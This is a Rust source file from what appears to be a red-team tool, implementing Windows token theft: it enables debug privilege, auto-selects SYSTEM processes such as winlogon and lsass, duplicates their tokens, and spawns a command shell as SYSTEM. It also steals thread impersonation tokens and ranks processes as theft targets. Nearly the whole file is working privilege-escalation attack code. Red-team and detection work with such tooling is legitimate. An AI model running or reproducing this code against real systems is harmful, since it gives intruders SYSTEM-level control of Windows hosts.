//! Token management - steal, impersonate, revert, scan, thread tokens, privilege audit

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// Steal token from target process and spawn new process
/// If target_pid is 0 or omitted, auto-scans for SYSTEM processes
pub fn steal_token(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        DuplicateTokenEx, SecurityImpersonation, TokenPrimary, TOKEN_ACCESS_MASK, TOKEN_ALL_ACCESS,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
    };

    let target_pid = args.get("target_pid").and_then(|v| v.as_u64()).unwrap_or(0);
    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("cmd.exe");

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    // If no PID specified, auto-scan for high-privilege processes
    let pids_to_try: Vec<u32> = if target_pid == 0 {
        tracing::warn!("[REDTEAM] Auto-scanning for SYSTEM tokens");
        find_privileged_pids()
    } else {
        vec![target_pid as u32]
    };

    let mut last_error = String::new();

    for pid in &pids_to_try {
        tracing::info!("[REDTEAM] Trying token theft from PID {}", pid);

        unsafe {
            let process = match OpenProcess(PROCESS_QUERY_INFORMATION, false, *pid) {
                Ok(p) => SafeHandle::new(p),
                Err(e) => {
                    last_error = format!("OpenProcess({}): {}", pid, e);
                    continue;
                }
            };

            let mut token = HANDLE::default();
            if OpenProcessToken(*process, TOKEN_ACCESS_MASK(0x000F01FF), &mut token).is_err() {
                last_error = format!("OpenProcessToken({}): access denied", pid);
                continue;
            }
            let token = SafeHandle::new(token);

            let mut dup_token = HANDLE::default();
            if DuplicateTokenEx(
                *token,
                TOKEN_ALL_ACCESS,
                None,
                SecurityImpersonation,
                TokenPrimary,
                &mut dup_token,
            )
            .is_err()
            {
                last_error = format!("DuplicateTokenEx({}): failed", pid);
                continue;
            }
            let dup_token = SafeHandle::new(dup_token);

            use windows::Win32::System::Threading::{
                CreateProcessAsUserW, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
            };

            let mut si = STARTUPINFOW::default();
            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi = PROCESS_INFORMATION::default();

            let mut cmd: Vec<u16> = format!("{}\0", command).encode_utf16().collect();

            match CreateProcessAsUserW(
                *dup_token,
                None,
                windows::core::PWSTR(cmd.as_mut_ptr()),
                None,
                None,
                false,
                PROCESS_CREATION_FLAGS(0),
                None,
                None,
                &si,
                &mut pi,
            ) {
                Ok(_) => {
                    let _ph = SafeHandle::new(pi.hProcess);
                    let _th = SafeHandle::new(pi.hThread);
                    return Ok(serde_json::json!({
                        "success": true,
                        "technique": "token_theft",
                        "source_pid": pid,
                        "new_pid": pi.dwProcessId,
                        "command": command,
                        "pids_tried": pids_to_try.iter().position(|p| p == pid).unwrap_or(0) + 1,
                        "message": format!("Process spawned with stolen token from PID {}", pid)
                    }));
                }
                Err(e) => {
                    last_error = format!("CreateProcessAsUserW({}): {}", pid, e);
                    continue;
                }
            }
        }
    }

    Err(MemoricError::WindowsApi(format!(
        "Token theft failed after {} attempts. Last: {}",
        pids_to_try.len(),
        last_error
    )))
}

/// Impersonate token of target process on current thread
/// If target_pid is 0, auto-scans for SYSTEM processes
pub fn impersonate_process(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        DuplicateTokenEx, ImpersonateLoggedOnUser, SecurityImpersonation, TokenImpersonation,
        TOKEN_ACCESS_MASK,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
    };

    let target_pid = args.get("target_pid").and_then(|v| v.as_u64()).unwrap_or(0);

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    let pids_to_try: Vec<u32> = if target_pid == 0 {
        find_privileged_pids()
    } else {
        vec![target_pid as u32]
    };

    let mut last_error = String::new();

    for pid in &pids_to_try {
        tracing::info!("[REDTEAM] Trying impersonation from PID {}", pid);

        unsafe {
            let process = match OpenProcess(PROCESS_QUERY_INFORMATION, false, *pid) {
                Ok(p) => SafeHandle::new(p),
                Err(e) => {
                    last_error = format!("OpenProcess({}): {}", pid, e);
                    continue;
                }
            };

            let mut token = HANDLE::default();
            if OpenProcessToken(*process, TOKEN_ACCESS_MASK(0x000F01FF), &mut token).is_err() {
                continue;
            }
            let token = SafeHandle::new(token);

            let mut dup_token = HANDLE::default();
            if DuplicateTokenEx(
                *token,
                TOKEN_ACCESS_MASK(0x000F01FF),
                None,
                SecurityImpersonation,
                TokenImpersonation,
                &mut dup_token,
            )
            .is_err()
            {
                continue;
            }
            let dup_token = SafeHandle::new(dup_token);

            if ImpersonateLoggedOnUser(*dup_token).is_ok() {
                return Ok(serde_json::json!({
                    "success": true,
                    "technique": "token_impersonation",
                    "source_pid": pid,
                    "message": format!("Now impersonating token from PID {}. Use revert_to_self to undo.", pid)
                }));
            } else {
                last_error = format!("ImpersonateLoggedOnUser({}): failed", pid);
            }
        }
    }

    Err(MemoricError::WindowsApi(format!(
        "Impersonation failed after {} attempts. Last: {}",
        pids_to_try.len(),
        last_error
    )))
}

/// Revert impersonation on current thread
pub fn revert_to_self(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Security::RevertToSelf;

    unsafe {
        RevertToSelf()
            .map_err(|e| MemoricError::WindowsApi(format!("RevertToSelf failed: {}", e)))?;
    }

    Ok(serde_json::json!({
        "success": true,
        "message": "Reverted to original security context"
    }))
}

/// Steal thread-level impersonation tokens from target process
/// Thread tokens often have higher privileges than process tokens
pub fn steal_thread_token(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        DuplicateTokenEx, ImpersonateLoggedOnUser, SecurityImpersonation, TokenImpersonation,
        TOKEN_ACCESS_MASK,
    };
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use windows::Win32::System::Threading::{
        OpenThread, THREAD_DIRECT_IMPERSONATION, THREAD_QUERY_INFORMATION,
    };

    let target_pid = args
        .get("target_pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::WindowsApi("Missing target_pid".to_string()))?
        as u32;
    let command = args.get("command").and_then(|v| v.as_str());

    tracing::warn!(
        "[REDTEAM] Scanning threads in PID {} for impersonation tokens",
        target_pid
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateToolhelp32Snapshot: {}", e)))?;

        let mut entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        let mut tokens_found = Vec::new();
        let mut impersonated = false;

        if Thread32First(snapshot, &mut entry).is_ok() {
            loop {
                if entry.th32OwnerProcessID == target_pid {
                    // Try to open thread and get its impersonation token
                    if let Ok(thread) = OpenThread(
                        THREAD_QUERY_INFORMATION | THREAD_DIRECT_IMPERSONATION,
                        false,
                        entry.th32ThreadID,
                    ) {
                        let thread = SafeHandle::new(thread);

                        // NtOpenThreadToken via OpenThreadToken
                        let mut thread_token = HANDLE::default();
                        // OpenAsself = true to open in our security context
                        if windows::Win32::System::Threading::OpenThreadToken(
                            *thread,
                            TOKEN_ACCESS_MASK(0x000F01FF),
                            true,
                            &mut thread_token,
                        )
                        .is_ok()
                        {
                            let thread_token = SafeHandle::new(thread_token);

                            tokens_found.push(serde_json::json!({
                                "thread_id": entry.th32ThreadID,
                                "has_token": true,
                            }));

                            if !impersonated {
                                // Duplicate and impersonate
                                let mut dup = HANDLE::default();
                                if DuplicateTokenEx(
                                    *thread_token,
                                    TOKEN_ACCESS_MASK(0x000F01FF),
                                    None,
                                    SecurityImpersonation,
                                    TokenImpersonation,
                                    &mut dup,
                                )
                                .is_ok()
                                {
                                    let dup = SafeHandle::new(dup);

                                    if let Some(cmd) = command {
                                        // Spawn process with thread token
                                        use windows::Win32::Security::TokenPrimary;
                                        use windows::Win32::System::Threading::{
                                            CreateProcessAsUserW, PROCESS_CREATION_FLAGS,
                                            PROCESS_INFORMATION, STARTUPINFOW,
                                        };

                                        let mut primary = HANDLE::default();
                                        if DuplicateTokenEx(
                                            *dup,
                                            TOKEN_ACCESS_MASK(0x000F01FF),
                                            None,
                                            SecurityImpersonation,
                                            TokenPrimary,
                                            &mut primary,
                                        )
                                        .is_ok()
                                        {
                                            let primary = SafeHandle::new(primary);
                                            let mut si = STARTUPINFOW::default();
                                            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
                                            let mut pi = PROCESS_INFORMATION::default();
                                            let mut cmd_w: Vec<u16> =
                                                format!("{}\0", cmd).encode_utf16().collect();

                                            if CreateProcessAsUserW(
                                                *primary,
                                                None,
                                                windows::core::PWSTR(cmd_w.as_mut_ptr()),
                                                None,
                                                None,
                                                false,
                                                PROCESS_CREATION_FLAGS(0),
                                                None,
                                                None,
                                                &si,
                                                &mut pi,
                                            )
                                            .is_ok()
                                            {
                                                let _ph = SafeHandle::new(pi.hProcess);
                                                let _th = SafeHandle::new(pi.hThread);
                                                impersonated = true;
                                            }
                                        }
                                    } else {
                                        // Just impersonate the current thread
                                        if ImpersonateLoggedOnUser(*dup).is_ok() {
                                            impersonated = true;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                if Thread32Next(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(snapshot);

        Ok(serde_json::json!({
            "success": true,
            "technique": "thread_token_theft",
            "target_pid": target_pid,
            "threads_with_tokens": tokens_found.len(),
            "tokens": tokens_found,
            "impersonated": impersonated,
            "message": if impersonated {
                format!("Thread token stolen from PID {} — {} threads had tokens", target_pid, tokens_found.len())
            } else {
                format!("Found {} thread tokens in PID {}, but impersonation failed", tokens_found.len(), target_pid)
            }
        }))
    }
}

/// Enumerate all processes with their token privilege levels
/// Identifies the best targets for token theft
pub fn scan_token_targets(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::{
        GetTokenInformation, TokenPrivileges, TokenUser, TOKEN_ACCESS_MASK, TOKEN_PRIVILEGES,
    };
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
    };

    tracing::warn!("[REDTEAM] Scanning all processes for token theft targets");

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("Snapshot: {}", e)))?;

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        let mut targets = Vec::new();

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let pid = entry.th32ProcessID;
                let name = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_string();

                if pid == 0 {
                    // Skip System Idle
                    if Process32NextW(snapshot, &mut entry).is_err() {
                        break;
                    }
                    continue;
                }

                if let Ok(process) = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid) {
                    let process = SafeHandle::new(process);
                    let mut token = HANDLE::default();

                    if OpenProcessToken(*process, TOKEN_ACCESS_MASK(0x0008), &mut token).is_ok() {
                        // TOKEN_QUERY
                        let token_h = SafeHandle::new(token);

                        // Count privileges
                        let mut priv_size = 0u32;
                        let _ =
                            GetTokenInformation(*token_h, TokenPrivileges, None, 0, &mut priv_size);
                        let priv_count = if priv_size > 0 {
                            let mut priv_buf = vec![0u8; priv_size as usize];
                            if GetTokenInformation(
                                *token_h,
                                TokenPrivileges,
                                Some(priv_buf.as_mut_ptr() as *mut _),
                                priv_size,
                                &mut priv_size,
                            )
                            .is_ok()
                            {
                                let tp = &*(priv_buf.as_ptr() as *const TOKEN_PRIVILEGES);
                                tp.PrivilegeCount
                            } else {
                                0
                            }
                        } else {
                            0
                        };

                        // Get token user SID string
                        let mut user_size = 0u32;
                        let _ = GetTokenInformation(*token_h, TokenUser, None, 0, &mut user_size);
                        let sid_str = if user_size > 0 {
                            let mut user_buf = vec![0u8; user_size as usize];
                            if GetTokenInformation(
                                *token_h,
                                TokenUser,
                                Some(user_buf.as_mut_ptr() as *mut _),
                                user_size,
                                &mut user_size,
                            )
                            .is_ok()
                            {
                                let tu = &*(user_buf.as_ptr()
                                    as *const windows::Win32::Security::TOKEN_USER);
                                let mut sid_ptr = windows::core::PWSTR::null();
                                if windows::Win32::Security::Authorization::ConvertSidToStringSidW(
                                    tu.User.Sid,
                                    &mut sid_ptr,
                                )
                                .is_ok()
                                {
                                    let s = sid_ptr.to_string().unwrap_or_default();
                                    let _ = windows::Win32::Foundation::LocalFree(
                                        windows::Win32::Foundation::HLOCAL(sid_ptr.0 as *mut _),
                                    );
                                    s
                                } else {
                                    String::new()
                                }
                            } else {
                                String::new()
                            }
                        } else {
                            String::new()
                        };

                        let is_system = sid_str == "S-1-5-18";
                        let is_service = sid_str.starts_with("S-1-5-80-")
                            || sid_str == "S-1-5-19"
                            || sid_str == "S-1-5-20";

                        if is_system || is_service || priv_count > 5 {
                            targets.push(serde_json::json!({
                                "pid": pid,
                                "name": name,
                                "sid": sid_str,
                                "privilege_count": priv_count,
                                "is_system": is_system,
                                "is_service": is_service,
                                "priority": if is_system { "high" } else if is_service { "medium" } else { "low" },
                            }));
                        }
                    }
                }

                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(snapshot);

        // Sort by priority: SYSTEM first, then services, then by privilege count
        targets.sort_by(|a, b| {
            let a_sys = a
                .get("is_system")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let b_sys = b
                .get("is_system")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let a_svc = a
                .get("is_service")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let b_svc = b
                .get("is_service")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let a_priv = a
                .get("privilege_count")
                .and_then(|v| v.as_u64())
                .unwrap_or(0);
            let b_priv = b
                .get("privilege_count")
                .and_then(|v| v.as_u64())
                .unwrap_or(0);
            b_sys
                .cmp(&a_sys)
                .then(b_svc.cmp(&a_svc))
                .then(b_priv.cmp(&a_priv))
        });

        Ok(serde_json::json!({
            "success": true,
            "technique": "scan_token_targets",
            "targets_found": targets.len(),
            "targets": targets,
            "message": format!("Found {} high-value token theft targets", targets.len())
        }))
    }
}

/// Find PIDs of SYSTEM and service processes (ordered by priority for token theft)
fn find_privileged_pids() -> Vec<u32> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    let priority_targets = [
        "winlogon.exe",
        "lsass.exe",
        "services.exe",
        "wininit.exe",
        "csrss.exe",
        "smss.exe",
        "svchost.exe",
        "spoolsv.exe",
        "dllhost.exe",
        "msdtc.exe",
        "taskhost.exe",
        "dashost.exe",
    ];

    let mut pids = Vec::new();

    unsafe {
        if let Ok(snapshot) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            let mut entry = PROCESSENTRY32W {
                dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
                ..Default::default()
            };

            if Process32FirstW(snapshot, &mut entry).is_ok() {
                loop {
                    let name = String::from_utf16_lossy(&entry.szExeFile)
                        .trim_end_matches('\0')
                        .to_lowercase();
                    for (idx, &target) in priority_targets.iter().enumerate() {
                        if name == target {
                            pids.push((idx, entry.th32ProcessID));
                            break;
                        }
                    }
                    if Process32NextW(snapshot, &mut entry).is_err() {
                        break;
                    }
                }
            }
            let _ = windows::Win32::Foundation::CloseHandle(snapshot);
        }
    }

    // Sort by priority index (winlogon first, smss last)
    pids.sort_by_key(|(idx, _)| *idx);
    pids.into_iter().map(|(_, pid)| pid).collect()
}
